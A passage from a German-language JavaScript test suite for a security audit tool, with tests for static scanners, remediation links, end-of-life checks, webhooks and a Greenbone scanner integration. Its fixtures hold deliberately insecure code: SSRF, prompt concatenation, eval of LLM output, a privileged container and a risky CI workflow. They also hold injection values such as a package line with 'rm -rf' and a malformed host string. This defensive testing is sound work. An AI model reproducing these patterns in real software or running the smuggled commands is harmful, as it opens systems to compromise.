    check('lifecycle: ohne vollstaendigen Lauf kein Auto-Resolve', db.findings[idA].status === 'OPEN');
    const st = store.stats(db);
    check('stats: offene nach Schweregrad', st.open.high === 2 && st.targets.length === 1);
    check('list: Statusfilter', store.listFindings(db, { status: 'FALSE_POSITIVE' }).length === 1);
  }

  console.log('Audit-Module (statisch):');
  {
    const { runStaticModules, lev1 } = require('../src/core/modules/static');
    const U = (label, content) => ({ label, content });
    const r = runStaticModules([
      U('app/package.json', JSON.stringify({ dependencies: { lodahs: '1.0.0', express: '4.17.1' }, scripts: { postinstall: 'node x.js' } })),
      U('app/docker-compose.yml', 'services:\n  db:\n    image: postgres\n    ports:\n      - "5432:5432"\n  app:\n    image: app\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n'),
      U('app/Dockerfile', 'FROM node:latest\nRUN npm ci\n'),
      U('app/.github/workflows/ci.yml', 'on: pull_request_target\npermissions: write-all\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af\n'),
      U('app/src/pay.js', 'const resetToken = Math.random().toString(36);\nif (req.headers.signature === expected) {}\nconst p = jwt.decode(t);\nawait prisma.user.update({ data: req.body });\nawait fetch(req.query.url);\nconst sys = `Du bist hilfreich. ${req.body.msg}`;\neval(completion.text);\n'),
      U('etc/ssh/sshd_config', 'PermitRootLogin yes\nPasswordAuthentication no\n'),
      U('app/safe.js', 'const t = crypto.randomBytes(32);\nif (timingSafeEqual(a, b)) {}\njwt.verify(t, k);\n'),
    ]);
    const ids = new Set(r.findings.map((f) => f.ruleId));
    check('static: alle Module gelaufen', r.ran.length === require('../src/core/modules/static').MODULES.length && r.ran.length >= 15 && !r.errors.length);
    check('static: Typosquat (vertauscht) erkannt', ids.has('typosquat-suspect') && lev1('lodahs', 'lodash') && !lev1('react', 'redux'));
    check('static: Compose privileged + Socket + DB-Port', ['container-privileged', 'container-docker-sock', 'container-db-port-public'].every((x) => ids.has(x)));
    check('static: Dockerfile latest + root', ids.has('docker-latest-tag') && ids.has('dockerfile-root-user'));
    check('static: GHA unpinned/write-all/pwn-request', ['gha-unpinned-action', 'gha-write-all', 'gha-pull-request-target'].every((x) => ids.has(x)));
    check('static: SHA-gepinnte Action nicht gemeldet', r.findings.filter((f) => f.ruleId === 'gha-unpinned-action').length === 1);
    check('static: SAST-Regeln', ['sast-insecure-random', 'sast-timing-compare', 'sast-jwt-decode-no-verify', 'sast-mass-assignment', 'sast-ssrf'].every((x) => ids.has(x)));
    check('static: sicherer Code ohne SAST-Befund', !r.findings.some((f) => /safe\.js/.test(f.location)));
    check('static: LLM Prompt-Injection + Senke', ids.has('llm-prompt-injection-concat') && ids.has('llm-output-to-sink'));
    check('static: sshd Root-Login, aber nicht Passwort', ids.has('ssh-root-login') && !ids.has('ssh-password-auth'));
  }

  console.log('Lösungswissen & Links:');
  {
    const { enrichRemedy, versionPatch, isAllowedLink } = require('../src/core/remedies');
    const { normalizeFinding: nf } = require('../src/core/schema');
    const vp = versionPatch({ ecosystem: 'npm', name: 'lodash', version: '4.17.15', fixed: '4.17.21' });
    check('remedy: npm-Versions-Patch', vp.command === 'npm install lodash@^4.17.21' && /"\^4\.17\.21"/.test(vp.manifest));
    check('remedy: pip (trivy-Typ) -> PyPI', /pip install --upgrade "django>=4.2.8"/.test(versionPatch({ ecosystem: 'pip', name: 'django', version: '4.2.1', fixed: '4.2.8' }).command));
    const cve = enrichRemedy(nf({ title: 'Verwundbare Abhaengigkeit: lodash 4.17.15 (CVE-2020-8203)', severity: 'high', category: 'Dependencies', package: { ecosystem: 'npm', name: 'lodash', version: '4.17.15', fixed: '4.17.21' } }, 'osv'));
    check('remedy: CVE mit NVD/heise/Video-Links + Patch', cve.versionPatch && ['nvd.nist.gov', 'heise.de', 'youtube.com'].every((h) => cve.links.some((l) => l.url.includes(h))));
    const hsts = enrichRemedy(nf({ ruleId: 'missing-hsts-header', title: 'HSTS-Header fehlt', category: 'Transport' }, 'webscan'));
    check('remedy: HSTS mit Erklärung, Schritten, nginx-Schnipsel', !!hsts.explanation && hsts.steps.length >= 2 && /add_header Strict-Transport-Security/.test(hsts.snippets.nginx));
    check('remedy: alle Links erlaubt', [...cve.links, ...hsts.links].every((l) => isAllowedLink(l.url)));
    check('remedy: fremder Link blockiert', !isAllowedLink('https://evil.example/x') && !isAllowedLink('http://heise.de/'));
    const unknown = ['container-privileged', 'gha-write-all', 'sast-ssrf', 'llm-server-exposed', 'dns-dangling-cname', 'dom-token-in-storage', 'api-bola-cross-tenant', 'toxic-db-breach', 'cookie-missing-httponly-session', 'web-sourcemap-exposed', 'exposed-env']
      .filter((id) => !enrichRemedy(nf({ ruleId: id, title: id, category: 'Config' }, 'x')).explanation);
    check('remedy: Wissensbasis deckt alle Modul-Regeln ab', unknown.length === 0);
  }

  console.log('Support-Enden, Linux-Pakete, Werkzeuge, Pläne, Greenbone:');
  {
    const eol = require('../src/core/eol');
    const feeds = require('../src/core/feeds');
    const R = require('../src/core/systems/remote');
    const bundled = require('../src/core/bundled');
    const sample = { postgresql: [{ cycle: '12', eolFrom: '2024-11-14' }, { cycle: '17', eolFrom: '2029-11-08' }], mariadb: [{ cycle: '10', eolFrom: '2020-01-01' }, { cycle: '10.11', eolFrom: '2028-02-16' }], ubuntu: [{ cycle: '18.04', eolFrom: '2023-05-31' }, { cycle: '24.04', eolFrom: '2029-05-31' }], openssl: [{ cycle: '3.0', eolFrom: '2030-01-01' }] };
    const full = { result: eol.PRODUCTS.slice(0, 9).map((name) => ({ name, releases: [{ name: '1', eolFrom: '2020-01-01', isEol: true, latest: { name: '1.2' } }] })).concat({ name: 'unwichtig', releases: [{ name: '1' }] }) };
    const parsed = eol.parseFull(JSON.stringify(full));
    check('eol: nur benötigte Produkte, Form geprüft', Object.keys(parsed).length === 9 && !parsed.unwichtig && parsed.postgresql[0].latest === '1.2');
    let bad = false; try { eol.parseFull('{"result":[]}'); } catch { bad = true; }
    check('eol: unbrauchbare Antwort wird abgelehnt', bad);
    check('eol: längste Versionsreihe, Datum entscheidet, unbekannt = null', eol.status('mariadb', '10.11.6', { data: sample }).cycle === '10.11' && !eol.status('mariadb', '10.11.6', { data: sample }).isEol && eol.status('postgresql', '12.3', { data: sample }).isEol && eol.status('postgresql', '99.1', { data: sample }) === null && eol.status('postgresql', '12.3', { data: null }) === null);
    check('eol: Feed aus erlaubter Quelle', feeds.FEEDS.some((f) => f.id === 'endoflife' && f.urls.every((u) => feeds.ALLOWED.some((a) => u.startsWith(a)))));
    const dbC = { kind: 'postgres', label: 'db', host: 'localhost' };
    const hasEol = (v) => R.assessDb(dbC, { version: v }).some((f) => f.ruleId === 'db-version-eol');
    eol.use(null);
    check('db: ohne Feed gilt die eingebaute Tabelle', hasEol('12.3') && !hasEol('17.1'));
    eol.use(sample);
    check('db: Feed entscheidet und nennt die Quelle', hasEol('12.3') && !hasEol('17.1') && /endoflife\.date/.test(R.assessDb(dbC, { version: '12.3' }).find((f) => f.ruleId === 'db-version-eol').description));
    check('bundled: Feed überstimmt die Tabelle', !bundled.bundledFindings([{ lib: 'openssl', version: '3.0.15' }], 'x', { now: Date.parse('2026-11-05') }).length);
    eol.use({});
    check('bundled: ohne passende Reihe gilt die Tabelle', bundled.bundledFindings([{ lib: 'openssl', version: '3.0.15' }], 'x', { now: Date.parse('2026-11-05') }).length === 1);
    eol.use(sample);
    const sshPk = ['@@os', 'PRETTY_NAME="Ubuntu 18.04 LTS"', 'ID=ubuntu', 'VERSION_ID="18.04"', '@@pkgs', 'openssl\t1.1.1-1ubuntu2', 'kaputt; rm -rf\t1', 'bash\t4.4', '@@end'].join('\n');
    check('linux: Betriebssystem ohne Support wird gemeldet', R.parseLinux(sshPk, 'h').some((f) => f.ruleId === 'linux-os-eol' && f.severity === 'high'));
    eol.use(null);
    const pk = R.packagesOf(sshPk);
    check('linux: Pakete gelesen, unsaubere Zeilen verworfen, Bestand richtig', pk.ecosystem === 'Ubuntu:18.04:LTS' && pk.pkgs.length === 2 && pk.pkgs[0].name === 'openssl');
    check('linux: OSV-Bestände', R.osvEcosystem({ id: 'debian', version: '12' }) === 'Debian:12' && R.osvEcosystem({ id: 'ubuntu', version: '23.10' }) === 'Ubuntu:23.10' && R.osvEcosystem({ id: 'rocky', version: '9.3' }) === 'Rocky Linux:9' && R.osvEcosystem({ id: 'arch', version: '1' }) === null);
    check('ssh: Paket-Abfrage ist Teil des festen Skripts', /dpkg-query -W/.test(R.SSH_SCRIPT) && /rpm -qa/.test(R.SSH_SCRIPT));
    const osvCalls = [];
    const pa = await R.auditPackages('h', pk, { say: () => {}, osvQuery: async (p) => { osvCalls.push(...p); return new Map([['Ubuntu:18.04:LTS|openssl|1.1.1-1ubuntu2', [{ id: 'A' }, { id: 'B' }]], ['Ubuntu:18.04:LTS|bash|4.4', [{ id: 'C' }]]]); }, osvDetails: async (id) => ({ A: { affected: [{ package: { name: 'openssl', ecosystem: 'Ubuntu:18.04:LTS' }, database_specific: { severity: 'high' }, ranges: [{ events: [{ introduced: '0' }, { fixed: '2' }] }] }] }, B: { affected: [{ package: { name: 'openssl', ecosystem: 'Ubuntu:18.04:LTS' }, ranges: [{ events: [{ introduced: '0' }] }] }] }, C: { affected: [{ package: { name: 'bash', ecosystem: 'Ubuntu:18.04:LTS' }, ranges: [{ events: [{ introduced: '0' }] }] }] } }[id]) });
    const paF = pa.findings.find((f) => f.ruleId === 'linux-pkg-cve-openssl');
    check('linux: eigener Befund nur mit verfügbarem Update, Schwere aus OSV', paF && paF.severity === 'high' && /\bA\b/.test(paF.description) && !/\bB\b/.test(paF.evidence) && !pa.findings.some((f) => f.ruleId === 'linux-pkg-cve-bash'));
    check('linux: Zusammenfassung zählt alles, nur Name und Version gehen raus', /2 von 2 Paketen/.test(pa.findings.find((f) => f.ruleId === 'linux-pkg-cves-summary').title) && Object.keys(osvCalls[0]).sort().join() === 'ecosystem,name,version');
    const multi = { severity: [{ type: 'CVSS_V3', score: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L' }, { type: 'Ubuntu', score: 'low' }], affected: [{ package: { name: 'openssl', ecosystem: 'Ubuntu:Pro:16.04:LTS' }, ranges: [{ events: [{ introduced: '0' }, { fixed: '1' }] }] }, { package: { name: 'openssl', ecosystem: 'Ubuntu:22.04:LTS' }, ranges: [{ events: [{ introduced: '0' }] }] }] };
    check('linux: Update einer anderen Distribution zählt nicht, Bewertung der Distribution zuerst', !R.judgeVuln(multi, 'openssl', 'Ubuntu:22.04:LTS').fixed && R.judgeVuln(multi, 'openssl', 'Ubuntu:Pro:16.04:LTS').fixed && R.judgeVuln(multi, 'openssl', 'Ubuntu:22.04:LTS').sev === 'low');
    const debianV = { severity: [{ type: 'CVSS_V3', score: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' }], affected: [{ package: { name: 'openssl', ecosystem: 'Debian:12' }, ecosystem_specific: { urgency: 'not yet assigned' }, ranges: [{ events: [{ introduced: '0' }, { fixed: '2' }] }] }] };
    check('linux: ohne Bewertung entscheidet der CVSS-Wert', R.judgeVuln(debianV, 'openssl', 'Debian:12').sev === 'critical');
    const noDetail = await R.auditPackages('h', pk, { say: () => {}, osvQuery: async () => new Map(), osvDetails: async () => null });
    check('linux: keine Treffer -> kein Befund', !noDetail.findings.length);

    // Werkzeuge
    const { toolHealth, verLess } = require('../src/core/tools');
    const toolRun = (nm, nu) => async (cmd, args) => (args[0] === '--version' ? nm : nu);
    const ok1 = { ok: true, stdout: 'Nmap version 7.95 ( https://nmap.org )', stderr: '' };
    const nuOk = { ok: true, stdout: '', stderr: 'Nuclei Engine Version: v3.11.1' };
    const now = Date.parse('2026-11-05');
    const good = await toolHealth({ run: toolRun(ok1, nuOk), templates: () => ({ enough: true, count: 500, dir: 'x', updatedAt: now - 86400000 }), now });
    check('werkzeuge: aktuell -> ok', good.every((h) => h.state === 'ok') && verLess('7.80', '7.90') && !verLess('7.100', '7.90'));
    const worn = await toolHealth({ run: toolRun({ ok: true, stdout: 'Nmap version 7.80 ( https://nmap.org )' }, nuOk), templates: () => ({ enough: false, count: 2, dir: 'x', updatedAt: now }), now });
    check('werkzeuge: altes nmap und zu wenige Vorlagen werden benannt', worn[0].state === 'old' && worn[1].state === 'empty' && /Vorlagen/.test(worn[1].detail));
    const stale = await toolHealth({ run: toolRun(ok1, nuOk), templates: () => ({ enough: true, count: 500, dir: 'x', updatedAt: now - 40 * 86400000 }), now });
    const gone = await toolHealth({ run: async () => ({ ok: false, stdout: '', stderr: '' }), templates: () => ({ enough: false, count: 0 }), now });
    check('werkzeuge: alte Vorlagen und fehlende Programme', stale[1].state === 'old' && gone.every((h) => h.state === 'missing'));

    // Pläne
    const sch = require('../src/core/schedule');
    const at = (s) => new Date(s).getTime();
    const daily = sch.normalize({ time: '03:00', freq: 'daily', targets: [{ type: 'url', value: 'https://a' }] });
    check('plan: unsaubere Werte werden ersetzt', sch.normalize({ time: 'x', freq: 'y', minSeverity: 'z', weekday: 9 }).time === '03:00' && sch.normalize({ freq: 'y' }).freq === 'daily' && sch.normalize({ minSeverity: 'z' }).minSeverity === 'high' && sch.normalize({ weekday: 9 }).weekday === 1);
    check('plan: täglich vor und nach der Uhrzeit', sch.nextRun(daily, at('2026-11-05T01:00:00')) === at('2026-11-05T03:00:00') && sch.nextRun(daily, at('2026-11-05T03:00:00')) === at('2026-11-06T03:00:00'));
    const weekly = { ...daily, freq: 'weekly', weekday: 1 };
    check('plan: wöchentlich auf den richtigen Tag', new Date(sch.nextRun(weekly, at('2026-11-05T12:00:00'))).getDay() === 1 && sch.nextRun(weekly, at('2026-11-09T03:00:00')) === at('2026-11-16T03:00:00'));
    const pending = { ...daily, createdAt: '2026-11-01T10:00:00', lastRun: '2026-11-02T03:00:00' };
    check('plan: verpasster Lauf wird nachgeholt, dann erst wieder geplant', sch.isDue(pending, at('2026-11-05T09:00:00')) && !sch.isDue({ ...pending, lastRun: '2026-11-05T09:00:00' }, at('2026-11-05T10:00:00')));
    check('plan: pausiert oder ohne Ziele nie fällig', !sch.isDue({ ...pending, enabled: false }, at('2026-11-05T09:00:00')) && !sch.isDue({ ...pending, targets: [] }, at('2026-11-05T09:00:00')));
    const alertsIn = { findings: [{ isNew: true, severity: 'critical', title: 'A' }, { isNew: true, severity: 'low', title: 'B' }, { isNew: false, severity: 'critical', title: 'C' }, { isNew: true, severity: 'high', suppressed: true, title: 'D' }, { isNew: true, severity: 'info', title: 'E' }] };
    check('plan: gemeldet wird nur Neues und Offenes ab der Schwelle', sch.alertsOf(alertsIn, 'high').map((f) => f.title).join() === 'A' && sch.alertsOf(alertsIn, 'low').map((f) => f.title).join() === 'A,B');
    check('plan: Webhook nur https, ohne Zugangsdaten in der Adresse', sch.validWebhook('https://hooks.slack.com/x') && !sch.validWebhook('http://a/x') && !sch.validWebhook('https://u:p@a/x') && !sch.validWebhook('nix'));
    const al = [{ severity: 'high', title: 'T', location: 'L', evidence: 'GEHEIM', description: 'GEHEIM' }];
    const slack = sch.webhookPayload('https://hooks.slack.com/x', { name: 'N', alerts: al }), disc = sch.webhookPayload('https://discord.com/api/webhooks/x', { name: 'N', alerts: al }), gen = sch.webhookPayload('https://example.com/x', { name: 'N', alerts: al });
    check('plan: Format je Empfänger, keine Belege im Webhook', typeof slack.text === 'string' && typeof disc.content === 'string' && gen.findings[0].title === 'T' && ![slack, disc, gen].some((p) => /GEHEIM/.test(JSON.stringify(p))));
    let sent = null;
    const hookOk = await sch.sendWebhook('https://example.com/x', { a: 1 }, { fetchImpl: async (u, o) => { sent = o; return { ok: true, status: 200 }; } });
    const hook500 = await sch.sendWebhook('https://example.com/x', {}, { fetchImpl: async () => ({ ok: false, status: 500 }) });
    const hookHttp = await sch.sendWebhook('http://example.com/x', {}, { fetchImpl: async () => { throw new Error('darf nicht'); } });
    check('plan: Webhook folgt keiner Weiterleitung, Fehler werden gemeldet', hookOk.ok && sent.redirect === 'error' && !hook500.ok && /500/.test(hook500.error) && !hookHttp.ok);

    // Greenbone: simulierter Server hinter dem Docker-Aufruf
    const gb = require('../src/core/greenbone');
    const makeServer = (opts = {}) => {
      const log = [], argv = [];
      let polls = 0, cfgFamilies = opts.cleanFromStart ? '' : '<family><name>Brute force attacks</name><nvt_count>5</nvt_count></family><family><name>Default Accounts</name><nvt_count>5</nvt_count></family>';
      const fam = () => `<get_configs_response status="200"><config id="cfg1"><name>Vigil schonend</name><families>${cfgFamilies}<family><name>Web Servers</name><nvt_count>9</nvt_count></family></families></config></get_configs_response>`;
      const exec = async (args, { input }) => {
        argv.push(args);
        const nl = input.indexOf('\n');
        const xml = input.slice(nl + 1).trim();
        log.push(xml);
        const reply = (x) => ({ ok: true, code: 0, stdout: x, stderr: '' });
        if (/^<get_version/.test(xml)) return reply('<get_version_response status="200"><version>22.7</version></get_version_response>');
        if (/^<get_feeds/.test(xml)) return reply(`<get_feeds_response status="200"><feed><type>NVT</type><version>2026</version>${opts.syncing ? '<currently_syncing/>' : ''}</feed></get_feeds_response>`);
        if (/^<get_nvt_families/.test(xml)) return reply('<r status="200"><families><family><name>a</name><max_nvt_count>120000</max_nvt_count></family></families></r>');
        if (/^<get_configs filter/.test(xml)) return reply('<get_configs_response status="200"></get_configs_response>');
        if (/^<create_config/.test(xml)) return reply('<create_config_response status="201" id="cfg1"/>');
        if (/^<get_configs config_id/.test(xml)) return reply(fam());
        if (/^<modify_config.*family_selection/.test(xml)) { if (!opts.refuseModify) cfgFamilies = ''; return reply('<modify_config_response status="200"/>'); }
        if (/^<modify_config/.test(xml)) return reply('<modify_config_response status="200"/>');
        if (/^<get_targets/.test(xml)) return reply('<get_targets_response status="200"></get_targets_response>');
        if (/^<create_target/.test(xml)) return reply('<create_target_response status="201" id="t1"/>');
        if (/^<get_tasks filter/.test(xml)) return reply('<get_tasks_response status="200"></get_tasks_response>');
        if (/^<create_task/.test(xml)) return reply('<create_task_response status="201" id="task1"/>');
        if (/^<start_task/.test(xml)) return reply('<start_task_response status="202"><report_id>rep1</report_id></start_task_response>');
        if (/^<stop_task/.test(xml)) return reply('<stop_task_response status="202"/>');
        if (/^<get_tasks task_id/.test(xml)) { polls++; return reply(`<get_tasks_response status="200"><task id="task1"><status>${polls < 2 ? 'Running' : 'Done'}</status><progress>${polls < 2 ? 40 : 100}</progress></task></get_tasks_response>`); }
        if (/^<get_reports/.test(xml)) return reply(`<get_reports_response status="200"><report id="rep1"><report><results>
          <result id="r1"><name>OpenSSH &lt; 9.8 RCE</name><port>22/tcp</port><severity>8.1</severity><qod><value>80</value></qod><description>installed 9.0</description><detection><result id="x"><details/></result></detection>
            <nvt oid="1.3.6.1.1"><name>OpenSSH</name><tags>summary=OpenSSH is outdated|impact=Remote code execution|solution=Update OpenSSH</tags><refs><ref type="cve" id="CVE-2024-6387"/><ref type="url" id="https://x"/></refs></nvt></result>
          <result id="r2"><name>Nur ein Protokolleintrag</name><port>general/tcp</port><severity>0.0</severity><qod><value>80</value></qod><nvt oid="1.3.6.1.2"><name>Log</name><tags/></nvt></result>
        </results></report></report></get_reports_response>`);
        return { ok: false, code: 1, stdout: '', stderr: 'unbekannt: ' + xml };
      };
      return { exec, log, argv, call: gb.createClient({ composeFile: 'C:/g/compose.yaml', user: 'admin', password: 'GEHEIMES-PW', exec }) };
    };
    const srv = makeServer();
    const prog = [];
    const gr = await gb.scanHost('scan.example', srv.call, { pollMs: 1, onProgress: (p) => prog.push(p) });
    const gf = gr.findings[0];
    check('greenbone: Scan läuft durch und liefert Befunde', gr.ran && gr.findings.length === 1 && gf.severity === 'high' && gf.source === 'greenbone' && /CVE-2024-6387/.test(gf.title) && gf.location === 'scan.example:22' && gf.remediation === 'Update OpenSSH');
    check('greenbone: Protokolleinträge sind keine Befunde, Fortschritt wird gemeldet', !gr.findings.some((f) => /Protokoll/.test(f.title)) && prog.some((p) => p.done === 40));
    check('greenbone: Passwort nie in der Befehlszeile, nur die eigene WSL-Umgebung', !srv.argv.flat().some((a) => /GEHEIMES-PW/.test(a)) && srv.argv[0].includes('vigil-gvm') && srv.argv[0].includes('/opt/vigil/gmp.sh'));
    const selection = srv.log.find((x) => /family_selection/.test(x));
    check('greenbone: Rateversuche, Standard-Zugänge und DoS ausgeschlossen', selection && !gb.BANNED_FAMILIES.some((f) => selection.includes(f)) && selection.includes('Web Servers'));
    check('greenbone: Aufgabe nutzt die schonende Konfiguration', /<create_task>.*<config id="cfg1"\/>/.test(srv.log.find((x) => /^<create_task/.test(x)) || ''));
    const refuse = makeServer({ refuseModify: true });
    let refused = '';
    try { await gb.scanHost('scan.example', refuse.call, { pollMs: 1 }); } catch (e) { refused = e.message; }
    check('greenbone: lässt sich die Konfiguration nicht säubern, startet KEIN Scan', /nicht gestartet/.test(refused) && !refuse.log.some((x) => /^<start_task/.test(x)));
    const busy = makeServer({ syncing: true });
    const br = await gb.scanHost('scan.example', busy.call, { pollMs: 1 });
    check('greenbone: während des Feed-Abgleichs kein Scan', !br.ran && !busy.log.some((x) => /^<start_task/.test(x)));
    const ac = new AbortController();
    const stopSrv = makeServer();
    const stopCall = async (x, o) => { if (/^<start_task/.test(x)) ac.abort(); return stopSrv.call(x, o); };
    const sr = await gb.scanHost('scan.example', stopCall, { pollMs: 1, signal: ac.signal });
    check('greenbone: Abbruch stoppt die Aufgabe im Scanner', !sr.ran && stopSrv.log.some((x) => /^<stop_task/.test(x)));
    const inj = await gb.scanHost('a"><x', makeServer().call, { pollMs: 1 });
    check('greenbone: ungültiger Host wird nicht verwendet', !inj.ran && /ungültig/.test(inj.notes[0]));
    let throwsUser = false; try { gb.createClient({ user: 'a b' }); } catch { throwsUser = true; }
    let throwsPw = false; try { gb.createClient({ password: 'a\nb' }); } catch { throwsPw = true; }
    check('greenbone: unsaubere Zugangsdaten abgelehnt', throwsUser && throwsPw);
    const noDocker = gb.createClient({ exec: async () => ({ ok: false, code: -1, stdout: '', stderr: 'WSL ist nicht verfügbar.' }) });
    let dockerErr = ''; try { await noDocker('<get_version/>'); } catch (e) { dockerErr = e.message; }
    check('greenbone: fehlendes WSL wird verständlich gemeldet', /WSL ist nicht verfügbar/.test(dockerErr));
    const denied = gb.createClient({ exec: async () => ({ ok: true, code: 0, stdout: '<r status="400" status_text="Bogus"/>', stderr: '' }) });
    let deniedErr = ''; try { await denied('<x/>'); } catch (e) { deniedErr = e.message; }
    const xmlTree = gb.parseXml('<!DOCTYPE a [<!ENTITY e "BOOM">]><a x="1 &amp; 2"><b>&e; &lt;ok&gt; &#65;</b><c/></a>');
    check('greenbone: Fehlerantwort und sicherer XML-Leser', /Bogus/.test(deniedErr) && !JSON.stringify(xmlTree).includes('BOOM'));
    const st = await gb.status(makeServer().call);
    check('greenbone: Verbindungstest nennt Version und Anzahl der Tests', st.ok && st.version === '22.7' && st.nvts === 120000 && !st.syncing);

    // Automatische Einrichtung ohne Docker Desktop
    const setup = require('../src/core/greenbone-setup');
    const compose = 'name: greenbone-community-edition\nservices:\n  gvmd:\n    image: x\n  gvm-tools:\n    image: y\n';
    const fakeSetup = (o = {}) => {
      const log = []; let exists = !!o.distro; let released = 0;
      const deps = {
        prereq: () => ({ ok: true }), keepAlive: () => () => { released++; }, sleep: async () => {}, waitMs: 5, pollMs: 1, syncWaitMs: o.syncWaitMs == null ? 50 : o.syncWaitMs,
        fetchImpl: async () => ({ ok: true, status: 200, text: async () => (o.badCompose ? 'name: etwas-anderes' : compose) }),
        run: async (cmd, args, opt = {}) => {
          log.push({ cmd, args, input: opt.input });
          const ok = (stdout = '') => ({ ok: true, code: 0, stdout, stderr: '' });
          if (args[0] === '--status') return o.noWsl ? { ok: false, code: 1, stdout: '', stderr: 'x' } : ok();
          if (args[0] === '-l') return ok(exists ? 'drei-d\nvigil-gvm\n' : 'drei-d\n');
          if (args[0] === '--install') { exists = true; return ok(); }
          if (/ pull -q/.test(opt.input || '') && o.pullFails) return { ok: false, code: 1, stdout: '', stderr: 'kein Netz' };
          return ok();
        },
      };
      return { log, deps, released: () => released };
    };
    const ready = (o = {}) => async () => ({ ok: true, syncing: !!o.syncing, nvts: o.nvts == null ? 120000 : o.nvts });
    const fs1 = fakeSetup();
    let savedPw = null;
    {
      // Fortsetzen: Was in der Umgebung schon liegt, wird nicht noch einmal geladen
      const seen = []; let fetched = 0;
      const compose = 'name: greenbone-community-edition\nservices:\n  gvm-tools:\n    image: a\n  gvmd:\n    image: b\n';
      const run = async (cmd, args, o = {}) => {
        const inp = String((o && o.input) || ''); seen.push(inp);
        if (cmd === 'wsl' && args[0] === '-l') return { ok: true, stdout: 'vigil-gvm\n' };
        if (/gmp\.sh \] && \[ -x/.test(inp)) return { ok: true, stdout: compose };
        if (/echo VIGIL_PULLED/.test(inp)) return { ok: true, stdout: 'VIGIL_PULLED\n' };
        return { ok: true, stdout: '' };
      };
      const r = await setup.runSetup({ password: 'x', deps: { run, prereq: () => ({ ok: true }), keepAlive: () => () => {}, fetchImpl: async () => { fetched++; return { ok: true, text: async () => compose }; }, sleep: async () => {}, progressMs: 100000, checkReady: async () => ({ nvts: 5, syncing: false }) } });
      check('greenbone: Fortsetzen lädt nichts doppelt', r.ok && fetched === 0 && !seen.some((s) => /compose\.yaml pull -q\n/.test(s) && !/-f .* pull -q [a-z]/.test(s) && !/mmin/.test(s)));
      seen.length = 0;
      const r2 = await setup.runSetup({ password: 'x', force: true, deps: { run, prereq: () => ({ ok: true }), keepAlive: () => () => {}, fetchImpl: async () => { fetched++; return { ok: true, text: async () => compose }; }, sleep: async () => {}, progressMs: 100000, checkReady: async () => ({ nvts: 5, syncing: false }) } });
      check('greenbone: Einrichtung wiederholen lädt neu', r2.ok && fetched === 1 && seen.some((s) => /pull -q\ntouch/.test(s)));
    }
    const sr1 = await setup.runSetup({ onPassword: (p) => { savedPw = p; }, deps: { ...fs1.deps, checkReady: ready() } });
    const wslArgs = fs1.log.map((x) => x.args.join(' '));
    const inputs = fs1.log.map((x) => x.input || '').join('\n');
    check('einrichtung: eigene Umgebung, Docker Engine, Greenbone, Passwort', sr1.ok && sr1.state === 'ready' && wslArgs.some((a) => a.startsWith('--install Ubuntu-24.04 --name vigil-gvm')) && /docker\.io docker-compose-v2/.test(inputs) && / pull -q/.test(inputs) && /up -d/.test(inputs) && savedPw.length >= 24);
    check('einrichtung: nie Docker Desktop, nie andere WSL-Umgebungen', !wslArgs.some((a) => /winget|Docker Desktop|drei-d/.test(a)) && fs1.log.filter((x) => x.args.includes('--exec')).every((x) => x.args.includes('vigil-gvm')));
    check('einrichtung: Passwort nur über stdin, nie in der Befehlszeile', !wslArgs.some((a) => a.includes(savedPw)) && fs1.log.some((x) => (x.input || '').trim() === savedPw));
    check('einrichtung: beendet die Umgebung und gibt den Speicher frei', fs1.released() === 1 && wslArgs[wslArgs.length - 1] === '--terminate vigil-gvm');
    const fs2 = fakeSetup({ distro: true });
    let pw2 = null;
    const sr2 = await setup.runSetup({ password: 'vorhanden', onPassword: (p) => { pw2 = p; }, deps: { ...fs2.deps, checkReady: ready() } });
    check('einrichtung: vorhandene Umgebung und Passwort bleiben', sr2.ok && pw2 === null && !fs2.log.some((x) => x.args[0] === '--install'));
    const sr3 = await setup.runSetup({ deps: fakeSetup({ noWsl: true }).deps });
    check('einrichtung: fehlendes WSL wird nicht selbst installiert, sondern erklärt', !sr3.ok && sr3.state === 'needs_wsl' && /wsl --install/.test(sr3.error));
    const fs4 = fakeSetup({ badCompose: true });
    const sr4 = await setup.runSetup({ deps: fs4.deps });
    check('einrichtung: fremde compose.yaml wird nicht benutzt', !sr4.ok && /nicht wie erwartet/.test(sr4.error) && !fs4.log.some((x) => / pull -q/.test(x.input || '')));
    const sr5 = await setup.runSetup({ deps: fakeSetup({ pullFails: true }).deps });
    check('einrichtung: Fehler werden verständlich gemeldet', !sr5.ok && /kein Netz/.test(sr5.error));
    const fs6 = fakeSetup({ syncWaitMs: 0 });
    const sr6 = await setup.runSetup({ onPassword: () => {}, deps: { ...fs6.deps, checkReady: ready({ syncing: true }) } });
    check('einrichtung: noch nicht fertig geladene Tests zählen nicht als bereit, Speicher wird trotzdem frei', !sr6.ok && fs6.released() === 1);
    check('einrichtung: Mindestwerte, automatisch nur mit Reserven', !setup.prerequisites({ platform: 'win32', totalMem: 2 * 2 ** 30, freeDisk: 100 * 2 ** 30 }).ok && !setup.prerequisites({ platform: 'win32', totalMem: 16 * 2 ** 30, freeDisk: 5 * 2 ** 30 }).ok && !setup.prerequisites({ platform: 'linux' }).ok && setup.prerequisites({ platform: 'win32', totalMem: 6 * 2 ** 30, freeDisk: 100 * 2 ** 30 }).ok && !setup.prerequisites({ platform: 'win32', totalMem: 6 * 2 ** 30, freeDisk: 100 * 2 ** 30, auto: true }).ok);
    check('einrichtung: Paketzahl und Fortschritt', setup.countImages(compose) === 2 && setup.parseImageCount('12\nImages 8.424GB').done === 12 && setup.parseImageCount('12\nImages 8.424GB').size === '8,4 GB' && setup.parseImageCount('').done === null);
    const fs9 = fakeSetup({ distro: true });
    const steps9 = [];
    await setup.runSetup({ password: 'x', onStep: (s) => steps9.push(s), deps: { ...fs9.deps, progressMs: 100000, checkReady: ready() } });
    check('einrichtung: meldet jeden Schritt in der angezeigten Reihenfolge, Download mit Paketzahl', steps9.some((s) => s.step === 'pull' && s.total === 2 && s.done === 0) && steps9.map((s) => setup.STEPS.findIndex((x) => x.id === s.step)).every((n, i, a) => n >= 0 && (i === 0 || n >= a[i - 1])));
    const fs7 = fakeSetup({ distro: true });
